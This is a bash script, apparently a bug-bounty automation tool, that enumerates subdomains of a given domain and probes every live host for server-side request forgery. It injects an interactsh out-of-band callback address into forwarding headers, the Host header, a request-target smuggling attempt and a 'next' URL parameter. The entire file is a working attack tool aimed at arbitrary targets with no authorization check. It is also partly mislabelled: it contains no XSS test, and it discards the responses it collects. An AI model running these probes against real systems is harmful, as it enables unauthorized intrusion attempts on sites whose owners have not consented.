#!/bin/bash

# SSRF + XSS Automation Script
# Usage:
#   ./ssrfxss.sh domain.com
#   ./ssrfxss.sh hosts.txt

GREEN="\e[1;32m"
RED="\e[1;31m"
NC="\e[0m"

if [ $# -eq 0 ]; then
    echo -e "${RED}Usage: $0 <domain or file>${NC}"
    exit 1
fi

input=$1

# Handle single domain or file input
if [ -f "$input" ]; then
    domains=$(cat $input)
else
    domains=$input
fi

# Ensure interactsh-client is installed
if ! command -v interactsh-client &> /dev/null; then
    echo -e "${RED}[ERR] interactsh-client not found. Install from projectdiscovery/interactsh.${NC}"
    exit 1
fi

# Start interactsh session
echo "[*] Starting interactsh-client session..."
collab=$(interactsh-client -quiet -o logs.txt -v | head -n 1)
echo "[*] Using OOB payload: $collab"

for domain in $domains; do
    echo -e "\n${GREEN}[*] Enumerating & probing: $domain${NC}"
    assetfinder --subs-only $domain | httprobe | while read url; do
        echo -e "\n${GREEN}[>] Testing: $url${NC}"

        # Method 1: X-Forwarded-For Header
        xff=$(curl -s -L $url -H "X-Forwarded-For: $collab" --max-time 5)

        # Method 2: X-Forwarded-Host Header
        xfh=$(curl -s -L $url -H "X-Forwarded-Host: $collab" --max-time 5)

        # Method 3: Host Header Injection
        hostinj=$(curl -s -L $url -H "Host: $collab" --max-time 5)

        # Method 4: HTTP Request Smuggling Style
        smuggle=$(curl -s -L $url --request-target "http://$collab/" --max-time 5)

        # Method 5: URL parameter injection (basic SSRF test)
        paramtest=$(curl -s -L "$url?next=http://$collab" --max-time 5)

        # Output
        echo -e "   [1] X-Forwarded-For  => Check interactsh logs"
        echo -e "   [2] X-Forwarded-Host => Check interactsh logs"
        echo -e "   [3] Host Header      => Check interactsh logs"
        echo -e "   [4] Smuggle Attempt  => Check interactsh logs"
        echo -e "   [5] Param Injection  => Check interactsh logs"

    done
done

echo -e "\n${GREEN}[*] Monitoring interactsh-client logs (logs.txt) for callbacks...${NC}"

